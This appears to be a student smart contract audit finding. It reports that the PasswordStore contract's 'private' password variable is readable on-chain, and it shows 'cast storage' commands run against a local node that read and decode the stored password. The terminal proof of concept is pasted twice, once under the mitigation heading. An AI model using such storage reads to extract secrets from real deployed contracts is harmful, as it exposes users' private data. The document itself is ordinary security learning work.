### [S-#] Private Data stored in storeage on chain HIGH (ROOT CAUSE + IMPACT)

**Description:** 
Contract `PasswordStore` stores private data onchain in `PasswordStore::s_password` private variable. Storing data that way will be visible for everone despite using `private` keyword. Contract should allow to retreive password only through `PasswordStore::getPassword()`.
**Impact:** 
High

**Proof of Concept:** (Proof of Code)
The below test case shows haow anyone can read the password directly from the blockchain. 

genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast storage 0x5fbdb2315678afecb367f032d93f642f64180aa3 1 --rpc-url http://127.0.0.1:8545
0x6d7950617373776f726400000000000000000000000000000000000000000014
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
myPassword
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ 

**Recommended Mitigation:** 
Whole architecure is to reconsider
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast storage 0x5fbdb2315678afecb367f032d93f642f64180aa3 1 --rpc-url http://127.0.0.1:8545
0x6d7950617373776f726400000000000000000000000000000000000000000014
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
myPassword
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ 
